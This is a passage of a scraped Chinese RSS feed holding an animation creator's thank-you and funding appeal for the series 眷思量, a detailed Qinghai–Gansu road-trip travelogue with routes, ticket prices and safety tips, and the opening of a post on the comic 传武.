src=\"https://pic4.zhimg.com/v2-c770c22a82439216652d0d272a5a665c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c770c22a82439216652d0d272a5a665c\" data-watermark-src=\"v2-4ff178f6c958848b2b1cc96d4ef8f3ab\" data-private-watermark-src=\"v2-aaa352a3451a303d0b4ab30e8b4c92af\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-30495d54466748b151ea26652f0c068e_720w.jpg?rss\" data-rawwidth=\"2054\" data-rawheight=\"843\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-30495d54466748b151ea26652f0c068e\" data-watermark-src=\"v2-0d68eb763c066de06a752ac4de3bcccf\" data-private-watermark-src=\"v2-776252e9d69b84b76fa81345577a4017\"></p>\n<p>感谢我的特效指导老师！眷思量里开场及难度最高的特效是找了专门的动画电影特效团队几何二进制做的，他们的特效总监也是眷思量的特效总监郭老师。在电影《哪吒魔童降世》和《姜子牙》里他们都负责了难度最高的特效之一。我与郭老师是一见如故，顺利解决了很多特效难题！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a06787323c135c8c5a62bb6af81c4833_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"697\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a06787323c135c8c5a62bb6af81c4833\" data-watermark-src=\"v2-27b7d17d4da244240ab5b3aba3f9999d\" data-private-watermark-src=\"v2-abbb24633ba9fad4ce864fc6fc473f27\"></p>\n<p>超级感谢我的配音导演姜SIR，作为光合积木的创始人，姜sir尽心尽力的帮我寻找最适合思量的声音。并出色的完成了整部剧配音的指导和设计，让我也从中学到了很多！不愧是我敬重的大神级业界前辈。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-868c5075e6b43d362aa83431df44995a_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"940\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-868c5075e6b43d362aa83431df44995a\" data-watermark-src=\"v2-bfcff05abfe409bc52bc5c56ee12fcde\" data-private-watermark-src=\"v2-245d8bafe870e2f2e542736efc9e972a\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-351ea4be2c9e2113cc840c84decc2975_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"720\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-351ea4be2c9e2113cc840c84decc2975\" data-watermark-src=\"v2-e8489e53bda3a49ff6145c8b7f53b82d\" data-private-watermark-src=\"v2-6b1186366347b58451b970013cc40ea4\"></p>\n<p>感谢负责音乐制作的作曲家白鸟老师，和白鸟是多年的老朋友了，这次的合作非常和我心意，但把他折腾够呛～～作曲家先生非常敬业优秀的完成了整个OST的创作，每首曲子都描摹出了思量故事里的各种情景。再配上师妹刘美麟的绝美声线献唱，深得我心。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4b791e1fa8fa1da856d8c276c0139ab5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1422\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-4b791e1fa8fa1da856d8c276c0139ab5\" data-watermark-src=\"v2-8617ab2fc2982ac7e46e9c587ce30589\" data-private-watermark-src=\"v2-2573e841dd3f976097977772238deb31\"></p>\n<p>当然还有我可爱的量子们，感谢你们的等待。还有给我的贴心留言，支持在默默赶工的我，每次看到这些留言，我就又有赶工的动力。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fd8eb4c688b8c0f3cc12ea61e166e61b_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-fd8eb4c688b8c0f3cc12ea61e166e61b\" data-watermark-src=\"v2-ad7f7fb0547e16e7745edbbba0bb62eb\" data-private-watermark-src=\"v2-d7ec33d7d8072c994bba379c12ba775b\"></p>\n<p>然后回到我的专业领域。 第一季我个人其实有不少不满意的地方。但因为时间限制和档期要求，从剧本到最后成片很多方面来不及深抠。而且开始做项目由于能调动的资源太少，且项目没有任何知名度和对人才的吸引力，所以各方面都找不到人帮忙，希望这个情况能在第二季及后续可能进行的大电影制作里根据预算情况逐步改善，争取后面能吸引到喜欢思量的能人加入，把项目做得更好吧。</p>\n<p>以及，不得不提的是，因为思量能不能一直做下去，跟每集播放量正相关，播放量的多少直接关系到后面集数平台宣推资源争取和下一季制作成本的洽谈，所以从现在来看，各方面真的是个未知数。。。我也只能做好我能做到的，其他方面就看造化啦。所以希望喜欢思量的小伙伴们能从通过各种官方渠道支持我们，这样我们才能收到相应收益把项目持续下去，不要去支持盗版TOT做动画真是很非常不易，原创动画更是无比艰难，请大家且看且珍惜~T--T。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-232ef6b5c1fddac649531711b33bad86_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-232ef6b5c1fddac649531711b33bad86\" data-watermark-src=\"v2-23289ef954bb02f19986dde23385b656\" data-private-watermark-src=\"v2-21727b90abf743de42539af321e7ce78\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-dc16a07105de605bb33358e1050fab24_720w.jpg?rss\" data-rawwidth=\"1895\" data-rawheight=\"1083\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc16a07105de605bb33358e1050fab24\" data-watermark-src=\"v2-d650246c828be010086a9c47f398392a\" data-private-watermark-src=\"v2-41fe2457cae80a674e181b91c963c64a\"></p>\n<p>最后，我想说的是，不管我能不能争取到继续做下去的资金和资源，都希望现在上线播出的这季作品可以让每个参与过眷思量的人，每个喜欢眷思量的小伙伴，都能说一句——值得！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266714288?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么我们对过去的动画评价要比现在的好？</a><br><a href=\"http://www.zhihu.com/question/25531649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请评价贱鸡行事系列动画？</a><br>\n","link":"http://www.zhihu.com/question/470160388/answer/1983181215?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"触摸蓝天、拥抱大地——青甘大环线记录","date":"2021-07-07 03:29:38","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>在人的一生中，总有一些地方，偶尔得知，念念不忘，一生向往。</p></blockquote>\n<p>写在最前：近几年自驾游成为了热门项目，国内有几个比较有名的自驾游路线如：川藏线、南北疆、海南环岛、青甘大环线。</p>\n<p>此次出行计划发生在五一假期，我和 6 位小伙伴从全国不同地方相约一起自驾体验美丽的西北风光。青甘大环线总行程 8 天（其中往返西宁为两天时间、实际旅程 6 天）人均花费 3500 元。</p>\n<p>伴随着夜间高原的凉风，同行中的一位广东人用关爱的眼神注视着裹紧衣领的我，那一刻我彷佛从他身上看到了标志性的人字拖。</p>\n<h2>综述：欢迎来到大西北！</h2>\n<h3>关于路线</h3>\n<p>青甘大环线全程约 2700 km，海拔高度 2300 至 4000 m。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/a50708cd28ff5dde781e319f80671481.gif\"><figcaption>做图片的时候还是漏了几个景点，不好意思</figcaption></figure><h3>具体行程</h3>\n<ul>\n<li>D1 : 西宁——倒淌河——青海湖——茶卡盐湖——茶卡镇</li>\n<li>D2 : 茶卡镇——可鲁克湖——大柴旦镇</li>\n<li>D3 : 大柴旦镇——翡翠湖——U 型公路——东台吉乃尔湖——乌苏特水上雅丹——西台吉乃尔湖——南八仙魔鬼城——大柴旦镇</li>\n<li>D4 : 大柴旦镇——阳关——鸣沙山月牙泉——敦煌市</li>\n<li>D5 : 敦煌市——莫高窟——张掖市</li>\n<li>D6 : 张掖市——七彩丹霞——祁连山卓尔山——西宁</li>\n</ul>\n<h3>行前准备及各类注意事项</h3>\n<h4>租车</h4>\n<p>各家平台的价格差距可以忽略不计，最好选择可以用芝麻信用担保免押的服务商。旅游旺季西宁本地租车价格较贵的话，可以选择从兰州租车，无里程限制。原本预定的华颂 7 当天车辆紧张帮我们免费升级了 GL8 。</p>\n<p>如果不想租车，当地有很多旅行团，从下了飞机搭乘机场巴士的时候就会看到很多宣传的，其中我听说的一种就是晚上坐火车在城市间穿梭赶路，白天在景区游览。因为我没体验过所以这里不做重点介绍。</p>\n<h4>住宿与餐饮</h4>\n<p>离开西宁后一路上吃到的更多的是烤串和炕锅，这里的羊肉没有那种膻味。住宿的话只有茶卡镇的住宿条件比较一般因为当地以民宿为主，其他途径地点的环境都还不错，没有想象中大西北的那种艰苦。</p>\n<p>西宁当地美食推荐：东乡春台手抓城（西宁市城东区八一路 202 号）。推荐菜品：八宝茶、面皮、烤羊肉、脆皮萝卜。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/06/50d992f1e7f452b45abdaab8d75cfa82.jpeg\"><figcaption>八宝茶、烤羊排、炒米粉、面片</figcaption></figure><h4>旅行费用分账</h4>\n<p>如果有合适的 app 可以直接使用，我们是在微信上直接搜索的小程序，有分账和明细功能，我们只需要根据清帐方案互相转账就可以了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/06/5efd736466e293b991845191baca12c6.png\"></figure><h4>其它物品</h4>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>提前下载好离线地图</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>水和食物（推荐自热类的食物）</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>药品（红景天口服液、晕车药、肠胃炎药）</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>便携式氧气瓶（当地医院或卫生所有售卖）</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>墨镜、脸基尼、冰袖和遮阳帽</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>防水防尘鞋套</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>较厚的衣服</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>补水面膜</td>\n<td>🔘</td>\n</tr>\n<tr>\n<td>垃圾袋</td>\n<td>🔘</td>\n</tr>\n</tbody></table></figure><p><strong>Tips : </strong>每天出门前一定要确认油箱油量，行程中部分路段没有加油站。</p>\n<hr>\n<h2>Day 1 : 「天空之境」。</h2>\n<p>📍西宁——倒淌河——青海湖——茶卡盐湖——茶卡镇</p>\n<p>第一站：<strong>倒淌河景区</strong>。路程约 100 公里、1 小时 30 分钟，早上 7 : 00 从西宁市区出发前往。</p>\n<p>倒淌河。里面可以免费骑牦牛拍照，景点不限制无人机，由于河流绵长建议无人机航拍俯视。</p>\n<ul>\n<li>门票： 40 元</li>\n<li>游览停留 ： 30 分钟</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/06/a425beab597694ee84b38e27ec30b985.jpeg\"></figure> <p>第二站：<strong>青海湖景区</strong>。路程约 50 公里、 1 小时。</p>\n<p>青海湖又名「库库淖尔」，蒙语「青色的海」之意。位于青海湖盆地内。由祁连山的大通山、日月山与青海南山间的断层陷落形成。南侧的二郎剑景区可以乘船游湖；西侧是鸟岛，每年 4 至 6 月有数十万只飞鸟可供观赏拍摄。分为二郎剑景区（主景区）和仙女湾景区（需单独购买门票），进入后可乘观光小火车前往二郎剑景区（观光小火车 20 元/人、电助力车 60 元/人），狭长的河岸线两侧都是美景可以拍照。</p>\n<ul>\n<li>门票： 90 元</li>\n<li>游览停留： 2 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/9e8e7028f969f86ff657ca26c9e8d238.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/452fbb94dc45700a3d646f0e7515548b.JPG\"></figure> <p>第三站：<strong>茶卡盐湖</strong>。路程约 150 公里、 2 小时 30 分。</p>\n<p>茶卡盐湖景区，分为天空之境（原景区）和天空壹号（新建景区）。购票后转乘景区巴士前往景区入口。进入景区后建议购买观光火车-轮船套票（ 160 元含鞋套租赁，观光路线为：轮船进，火车出），套票额外送一份青海盐小礼品在出口处领取。最佳观赏时间是早上 10 点前和下午 5 点后，能够拍出来天空之境的感觉。</p>\n<ul>\n<li>两个景点门票均为 ： 60元，景区对浙江省户籍游客实行免票制度</li>\n<li>游览停留： 2 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/84b0ab45cc0cac27861a3995a2cd380c.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/b4ded8f567941a5975bdfbe14a8d246e.JPG\"></figure> <p>预计抵达茶卡镇时间为 18 点。</p>\n<p>宿茶卡镇，当地很多旅店都是农家乐形式。我们住的那家店老板跟我们说，因为茶卡镇的位置关系，相比于大柴旦镇而言它缺少了山脉阻挡风，要更冷一些。</p>\n<p>在茶卡镇因为海拔上升可能会出现高原反应，我和朋友的情况仅仅是头晕，如有必要优先选择镇上可以吸氧的酒店，茶卡镇中心卫生所有便携氧气瓶售卖  24 元/升/罐。</p>\n<h2>Day 2 : 与海鸥相处的片刻。</h2>\n<p>📍茶卡镇——可鲁克湖——大柴旦镇</p>\n<p>上午 11 : 30 左右出发离开茶卡镇前往今日唯一的景点<strong>克鲁克湖</strong>。路程约 250 公里、 2 小时 30 分钟。</p>\n<p><strong>Tips :</strong> 途径乌兰服务区，建议在此处停留就餐，加满车油。</p>\n<ul><li>克鲁克湖景区，门票 20 元（使用《高德地图》购票 10 元），游览停留两小时</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/1e1371ea5826df1d4f86a93087e725f0.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/1f4138a4a65aad015de7499042103123.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/ec70f83ab4207a25102f9fe04cd312a4.JPG\"></figure><p>预计抵达大柴旦镇时间为 18 点。</p>\n<p>宿大柴旦镇，因为后面一天的旅程是在大柴旦镇附近完成一个小环线，建议直接选择同一家酒店入住两天避免搬运行李的麻烦。</p>\n<h2>Day 3 : 无人区自救史。</h2>\n<p>📍大柴旦镇——翡翠湖——U 型公路——东台吉乃尔湖——乌苏特水上雅丹——西台吉乃尔湖——南八仙魔鬼城——大柴旦镇</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/4571fb47d0a9a803a81ee534f0f186bf.JPG\"></figure><p>第一站：<strong>翡翠湖景区</strong>，路程约 15 公里、 20 分钟，早上 8 : 00 出发前往。</p>\n<p>翡翠湖景区（景区交通 40 元/人，五个停留参观站），电影《送你一朵小红花》拍摄地，独特的盐湖风貌，目前还处于初步开发免费开放状态。湖水因为含矿量不同，所以呈现出绿、蓝、黄、褐等不同的色彩，盐床或淡青、翠绿或深蓝交替、与湖里盐花辉印调色成碧绿焕彩的翡翠田，在蓝天白云的衬托下宛如一块块美玉一般。</p>\n<ul>\n<li>门票 ： 免费</li>\n<li>游览停留： 2 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/e97467ce70e3699832981f74151f8138.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/039bdf4947fe11cffe6ed12e89700381.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/a8dc1b161ba9bee96d4dbe29b4fa1902.JPG\"></figure> <p>第二站：<strong>东台吉乃尔湖</strong>，途径 G 315 公路。路程约 200 公里、 3 小时。</p>\n<p>从这段路开始即将进入没有信号塔的无人区，最好提前下载好离线地图，防止迷路。</p>\n<p>路途中有较为平坦的土路有很多人停车在路旁吃饭，整条公路会有 3 个 U 型路，其中第二个和第三个甚为壮观，完全不要担心自己找不到最壮观的U型公路因为最壮观的那里会有大批游客停留，因为网络火爆的 U 型公路为了游客安全也设立的警示牌，禁止停车否则将会记 3 分并处罚款 200 元同时有警察开车劝阻离开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/2f25ea82e4a29dc983e442711eaf5a58.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/d4f209ed1f40e9009a3fbb0502e070ee.JPG\"></figure><p>东台吉乃尔湖景区，属于未开发景区，管理权属于当地一家锂矿开采公司，停车后需要步行约 15 分钟才能到达湖边。湖水较茶卡盐湖更为翠绿。</p>\n<ul>\n<li>门票 ： 免费</li>\n<li>游览停留： 1 小时 30 分钟</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/dfc76b554c1dc08e38eca1e588c82a74.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/ba58925311ce920c36c009d39a3f4e30.JPG\"></figure><p>目前好像因为锂矿开采需要暂时封闭，并且因为青海省要到 2022 年才有可能继续对外开放。（<a href=\"https://mp.weixin.qq.com/s/RAe3sPmMQa3BjGhGUTtxQA\">相关阅读</a>）</p>\n<p>第三站：<strong>乌苏特水上雅丹</strong>。路程约 30 公里、 30 分钟。</p>\n<p>乌素特雅丹位于南八仙雅丹群之中，区域内雅丹土丘高 10 至 25 米，最高可达 50 米。雅丹遍布于湖泊之中，是发现的世界上最早的一处水上雅丹景观。乌素特雅丹西临一里坪，东连马海，这里本来没有水，有年山洪暴发，发源于昆仑山的那棱格勒河河水改道，淹没了这片区域，形成了水上雅丹地貌。一到春秋季节，成群的水鸟和野鸭，或翱翔在湛蓝的天空中，或戏水在微光波映的湖水里 ，或在雅丹之上奔跑追逐，因此，这里被当地人称为「鸭湖」，又被游客们称作「百鸟千岛湖」。</p>\n<p>进入景区后乘坐观光小火车前往景区内部（四个停留参观站），世界上最早的一处水上雅丹景区。</p>\n<ul>\n<li>门票 ：  118 元（含观光车），景区对浙江省户籍游客实行免票制度但需要额外购买 60 元景区观光车票</li>\n<li>游览停留： 1 小时 30 分钟</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/39957c43589fb58cf7361e19376da5fe.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/1d1a982ca98e5284a47a45ad5c1a0fc2.PNG\"><figcaption>谁都不能阻挡我吃拿破仑蛋糕（太像了！）</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/03353221432c8be1a02d9a5e333168ab.jpg\"></figure><p>第四站：<strong>西台吉乃尔湖</strong>。路程约 40 公里、 40 分钟。</p>\n<p>这段公路后半段因盐湖侵蚀属于未养护路段，路况较差，谨慎驾驶。</p>\n<p>西台吉乃尔湖，不需要刻意停留，在导航的路上其实就已经能够看到。条件允许的话建议使用无人机航拍，道路两侧湖水有泾渭分明的感觉，很是震撼。</p>\n<ul><li>游览停留： 10 ～ 15 分钟。</li></ul>\n<p>第五站：<strong>南八仙魔鬼城</strong>。路程约 160 公里、 2 小时 30 分钟。</p>\n<p>路途折返至东台村时，建议加满车油。</p>\n<p>南八仙魔鬼城，在道路两侧可以直接参观。结合行程时间刚好可以拍摄日落。</p>\n<p>此路段平均车速较快，在路边停靠时注意安全。在路中央停留拍照时一定要有朋友观察后方车况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/c44ae2e2faebc5b95b7b637381f701d4.JPG\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/d817abe74c207fde9a7451f82b5f937f.JPG\"></figure><p>预计抵达大柴旦镇时间为 22 点。</p>\n<p>宿大柴旦镇，返程道路两旁属于牧区，有设置防止牛羊闯入公路的栅栏，但因为野兔体形小，时常会有蹿出来的情况，谨慎驾驶。</p>\n<h2>Day 4 : 西出阳关无故人。</h2>\n<p>📍大柴旦镇——阳关——鸣沙山月牙泉——敦煌市区</p>\n<p>早上10点在大柴旦镇加满油后，出发前往<strong>阳关景区</strong>，今天海拔开始下降从青海省抵达甘肃省。路程约 350 公里 4 小时 30 分钟。</p>\n<p>进入甘肃界后，在第一个服务区停留就餐。</p>\n<p>阳关景区，在古董滩远眺丝绸之路，感受到当时繁华、车轮滚滚。景区中心有阳关博物馆。</p>\n<ul>\n<li>门票： 60 元</li>\n<li>游览停留： 2 小时 30 分钟</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/8318067e24a98b3dd792672d575027ba.JPG\"></figure><p>第二站：<strong>鸣沙山月牙泉景区</strong>。路程约 60 公里、 1 小时。</p>\n<p>鸣沙山月牙泉景区，景区内有众多付费项目包含但不限于：体验飞行俯瞰（ 480 元/人），越野车登顶沙丘（ 260 元/人），骑骆驼等。根据抵达时间，建议登顶后找到合适角度拍摄月牙泉日落。</p>\n<ul>\n<li>门票： 120 元（单次购票，三天有效期，有效期内不限制进出景区次数）</li>\n<li>游览停留： 2 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/e48107eff82573a6ff8018b6faf089a6.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/b1c6dae863f41a7f30af93af70308da2.jpg\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/06/537e8362e380b67676ecce0609b92780.JPG\"></figure> <p>当我把鸣沙山的照片发在朋友圈后，有很多朋友说这不就是 macOS Mojave 嘛，哈哈哈哈！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/d9b403f884d01f2bf21e040bed9fcfc1.jpg\"></figure><p>预计抵达敦煌市区时间为 22 点。</p>\n<h2>Day 5 : <strong>千年一瞬，梦回敦煌</strong>。</h2>\n<p>📍敦煌市区——莫高窟景区——张掖市</p>\n<p>第一站：<strong>莫高窟景区</strong>。路程约 30 公里、30 分钟，早上 10 : 30 分出发前往。</p>\n<p>莫高窟景区，需提前预约，因为有电影观看，所以景区建议提前半小时抵达取票后排队进入数字展览中心等待电影放映。景区内的佛窟从东汉至五代十国由民间各家族自行开凿建设，有一些洞窟由明清当地居民自行补色修缮。景区在繁忙季节开设应急票和正常参观票，建议购买正常参观票。游客凭票由导游带领参观 9 个佛窟，佛窟内禁止拍照。</p>\n<ul>\n<li>门票： 238 元（含数字展览中心两部电影观看、景区内交通费、导游讲解费）</li>\n<li>游览停留： 3 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/ba516ec55bde79cdbe1ee4ef9cf62078.jpg\"></figure><p>游览结束后可自行在文创店内购买文创雪糕和周边。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/fcc68cf756edec3f4965b52f6ec4cbce.jpg\"></figure><p>离开时在敦煌市内加满油。预计抵达张掖市时间为 22 点。</p>\n<p>宿：张掖镇。可选性较多，我们选择住在张掖智选假日酒店。祁连羊肉馆的红柳烤肉比较好吃，有兴趣的还可以第二天早上品尝一下甜胚子奶茶。</p>\n<h2>Day 6：归途与新起点。</h2>\n<p>📍张掖市——七彩丹霞——祁连山卓尔山——西宁</p>\n<p>早上 10 : 30 分，出发前往本次行程的最后一个景点<strong>七彩丹霞风景区</strong>，路程约 50 公里、 1 小时</p>\n<p>七彩丹霞风景区，特殊的山貌特征，下午观看最为震撼。</p>\n<ul>\n<li>门票： 75 元（含景区观光车， 6 个停留点）</li>\n<li>游览停留： 2 小时</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/628389ac2026ed889692372df11cd3fe.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/559e401f1eed175bf37b6a09f15132b4.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/291bd8d1385d0e90d85a532406ed7d37.JPG\"></figure><p>离开时在张掖市内加满油。</p>\n<p>我今年要努力吃完各个景区的文创雪糕！（<a href=\"https://mp.weixin.qq.com/s/bVm9D2AnsXlOxu9TXPNhKQ\">相关阅读</a>）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/67e9fa74cfdef642fb61315f3f90d7ab.jpg\"></figure><p>返程的这段路程将穿越祁连山脉，最高海拔 3800 米，上山、下山途中有多个急转弯和 U 型弯，来往货车比较多，注意减速慢行，沿途风景仿佛一日四季，停车拍照时注意安全。因为我们去的时间不是特别合适草原的草还不是特别绿。</p>\n<p>预计抵达西宁市的时间为 21 点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/06/2dae28578ea0ddb5f316624176fab5a0.jpg\"><figcaption>在西宁吃川菜的时候店内的小老虎们让我想到了韦小宝的虎头帽</figcaption></figure><h2><strong>后记</strong></h2>\n<p>这篇游记也是被我用各种原因拖拖拉拉到现在才发出来，希望有自驾兴趣的伙伴参考我的这个路线能够帮助到你节省一些时间，没想到自己啰啰嗦嗦介绍了小三千字。如果你看到这里，十分感谢你愿意花费流量（毕竟图和视频还挺多的）和耐心阅读。</p>\n<p>当然我还有一大堆图片没有分享，找个机会我会单独放一个链接只用来展示图集。</p>\n<p>旅途中有太多的美景，它们安安静静地伫立在中华大地，不曾被人们打扰、开发。我举着手机记录着它们，害怕错失一眼，这段旅途是我 2021 年至今最奇妙的几天，它像是一阵清风吹散了我内心的阴霾，让我怀抱希望，被美景收买去拥抱美好。</p>\n<p>这些居民们带着他们的友善迎接着每年来往的游客。我依然记得在茶卡镇，我因为高原反应头疼的抬不起来，民宿老板很热情的给我端了一杯他刚熬好的姜茶。</p>\n<p>离开西宁之后，我认识了更多新朋友跟他们讲述这一路的美好，像是找回了那个大学时期乐于分享的旧我，但我知道，我比那时更加阳光自信。</p>\n<p>如果你也彷徨迷惘、不妨出去走走～</p>\n<h2>相关阅读</h2>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/20970233\">国内有哪些适合自驾游的旅行线路？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/38225142\">几月去青海最好？青海及周边有哪些地方值得推荐？ （青海旅游实用攻略）</a></li>\n<li><a href=\"https://www.zhihu.com/question/23015333\">去青海旅游有什么必须尝的美食？</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n","link":"https://sspai.com/post/67554"},{"title":"如何评价国产漫画《传武》？","date":"2021-07-07 03:00:11","description":"\n<blockquote>\n<i><b>观前提醒：</b>1，本文是以《传武》漫画为基础做的简单猜想；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，神魔以及各门派的简介，都是仅在《传武》世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i><br><i>3，文中出现的如：详情之类的字眼，目的是为了缩短篇幅，不代表观点一定正确；</i>\n</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-c2221ef6c59fff3a021711c42f7e16b8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"638\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-c2221ef6c59fff3a021711c42f7e16b8\" data-watermark-src=\"v2-317cee823ac8be9d8a7d33b38a7b3ee5\" 